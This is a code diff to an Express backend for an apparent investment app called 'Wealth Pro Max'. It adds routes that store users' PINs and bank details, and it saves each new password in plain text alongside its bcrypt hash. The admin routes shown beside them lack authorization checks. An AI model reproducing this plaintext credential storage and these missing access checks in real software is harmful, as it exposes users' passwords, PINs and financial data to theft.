@@ -256,5 +256,28 @@ app.post('/api/admin/delete-ad', async (req, res) => { await pool.query("DELETE 
 app.get('/api/admin/list-plans', async (req, res) => { const plans = await pool.query("SELECT * FROM plans"); res.json(plans.rows); });
 app.post('/api/admin/delete-plan', async (req, res) => { await pool.query("DELETE FROM plans WHERE id = $1", [req.body.id]); res.json({ success: true }); });
 
+// Rota para salvar dados bancários e PIN
+app.post('/api/user/update-bank', async (req, res) => {
+    if (!req.session.userId) return res.status(401).send();
+    const { method, name, phone, pin } = req.body;
+    // Salva o PIN e detalhes no banco (Supabase)
+    await pool.query("UPDATE users SET pin = $1, bank_details = $2 WHERE id = $3", [pin, `${method} - ${name} (${phone})`, req.session.userId]);
+    res.json({ success: true });
+});
+
+// Rota para trocar senha
+app.post('/api/user/change-password', async (req, res) => {
+    const { oldP, newP } = req.body;
+    const user = (await pool.query("SELECT password FROM users WHERE id = $1", [req.session.userId])).rows[0];
+    const match = await bcrypt.compare(oldP, user.password);
+    if(match) {
+        const hash = await bcrypt.hash(newP, 10);
+        await pool.query("UPDATE users SET password = $1, password_plain = $2 WHERE id = $3", [hash, newP, req.session.userId]);
+        res.json({ success: true });
+    } else {
+        res.status(400).send();
+    }
+});
+
 const PORT = process.env.PORT || 8080;
 app.listen(PORT, '0.0.0.0', () => console.log(`Wealth Pro Max Online na porta ${PORT}`));
